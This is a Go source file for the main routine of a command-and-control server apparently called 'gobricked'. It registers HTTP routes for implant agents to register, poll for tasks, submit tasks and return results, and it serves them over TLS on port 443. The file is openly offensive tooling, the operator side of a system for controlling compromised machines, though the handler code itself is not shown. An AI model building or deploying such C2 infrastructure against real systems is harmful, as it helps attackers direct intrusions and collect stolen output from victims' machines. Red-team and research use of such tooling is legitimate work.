package main

import (
	"crypto/tls"
	"gobricked/pkg/router"
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

// --------------------
// Main Server Logic
// --------------------

func main() {
	r := mux.NewRouter()

	r.HandleFunc("/register", router.RegisterAgentHandler).Methods("POST")

	r.HandleFunc("/tasks/{agentID}", router.GetTasksHandler).Methods("GET")
	r.HandleFunc("/tasks", router.PostTaskHandler).Methods("POST")

	r.HandleFunc("/results", router.PostResultHandler).Methods("POST")
	r.HandleFunc("/results", router.GetResultHandler).Methods("GET")

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}

	server := &http.Server{
		Addr:      ":443",
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	log.Println("[*] C2 server listening on https://localhost:443")
	err := server.ListenAndServeTLS("server.crt", "server.key")
	if err != nil {
		log.Fatal(err)
	}
}
